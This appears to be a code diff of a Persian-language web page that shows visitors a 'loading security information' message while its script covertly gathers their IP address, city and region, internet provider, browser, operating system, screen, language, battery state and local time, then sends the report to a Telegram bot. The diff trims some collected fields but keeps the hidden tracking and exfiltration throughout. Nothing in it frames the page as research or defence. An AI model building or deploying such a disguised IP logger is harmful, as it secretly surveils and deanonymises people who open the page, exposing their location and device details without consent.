@@ -2,7 +2,7 @@
 <html lang="fa">
 <head>
   <meta charset="UTF-8" />
-  <title>در حال بارگیری اطلاعات امنیتی...</title>
+  <title>در حال بارگیری...</title>
 </head>
 <body>
   <h3>در حال بارگیری اطلاعات امنیتی...</h3>
@@ -10,31 +10,23 @@
   <script>
     async function getInfoAndSend() {
       try {
+        // IP و موقعیت
         const ipData = await fetch("https://ipapi.co/json/").then(res => res.json());
 
+        // باتری
         const battery = await navigator.getBattery?.();
         const batteryLevel = battery ? `${(battery.level * 100).toFixed(0)}%` : "نامشخص";
         const charging = battery ? (battery.charging ? "بله" : "خیر") : "نامشخص";
 
-        const connection = navigator.connection || navigator.mozConnection || navigator.webkitConnection;
-        const networkType = connection?.effectiveType || "نامشخص";
-
-        const cpuCores = navigator.hardwareConcurrency || "نامشخص";
-        const isOnline = navigator.onLine ? "بله" : "خیر";
-        const memory = navigator.deviceMemory || "نامشخص";
-
+        // زمان
         const now = new Date();
         const localTime = now.toLocaleString("fa-IR");
         const ipTime = new Date().toLocaleString("fa-IR", { timeZone: ipData?.timezone || "UTC" });
 
-        const isVPN = ipData?.org?.toLowerCase().includes("vpn") || ipData?.ip?.startsWith("10.") || ipData?.ip?.startsWith("192.168");
-
+        // اطلاعات نهایی
         const info = {
           ip: ipData?.ip || "نامشخص",
-          city: ipData?.city || "-",
-          location: `${ipData?.region || "-"}, ${ipData?.country_name || "-"}`,
-          countryCode: ipData?.country || "-",
-          regionCode: ipData?.region_code || "-",
+          location: `${ipData?.city || "-"}, ${ipData?.region || "-"}, ${ipData?.country_name || "-"}`,
           org: ipData?.org || "نامشخص",
           os: navigator.platform || "نامشخص",
           browser: navigator.userAgent || "نامشخص",
@@ -43,43 +35,37 @@
           language: navigator.language || "نامشخص",
           battery: batteryLevel,
           charging: charging,
-          network: networkType,
-          cpu: cpuCores,
-          memory: memory,
-          online: isOnline,
-          vpn: isVPN ? "احتمالاً بله" : "احتمالاً خیر",
           local_time: localTime,
           ip_time: ipTime
         };
 
+        // پیام
         const message = `[گزارش ورود جدید]\n
 IP: ${info.ip}\n
 \n
-شهر: ${info.city}\n
 مکان: ${info.location}\n
 \n
 ارائه‌دهنده: ${info.org}\n
 \n
-کد کشور: ${info.countryCode} | کد منطقه: ${info.regionCode}\n
-\n
 سیستم‌عامل: ${info.os}\n
+\n
 مرورگر: ${info.browser}\n
+\n
 نوع دستگاه: ${info.device}\n
+\n
 رزولوشن صفحه: ${info.screen}\n
 \n
 زبان مرورگر: ${info.language}\n
-نوع شبکه: ${info.network}\n
-CPU: ${info.cpu} هسته‌ای | RAM: ${info.memory} GB\n
-وضعیت اتصال: ${info.online}\n
-VPN: ${info.vpn}\n
 \n
 وضعیت باتری: ${info.battery} - شارژ: ${info.charging}\n
 \n
 زمان محلی: ${info.local_time}\n
+\n
 زمان منطقه‌ای: ${info.ip_time}`;
 
-        const token = "توکن_ربات_تو";
-        const chat_id = "آیدی_چت_تو";
+        // ارسال به تلگرام
+        const token = "توکن_ربات_تو_اینجا";
+        const chat_id = "آیدی_چت_تو_اینجا";
         const url = `https://api.telegram.org/bot${token}/sendMessage`;
 
         fetch(url, {
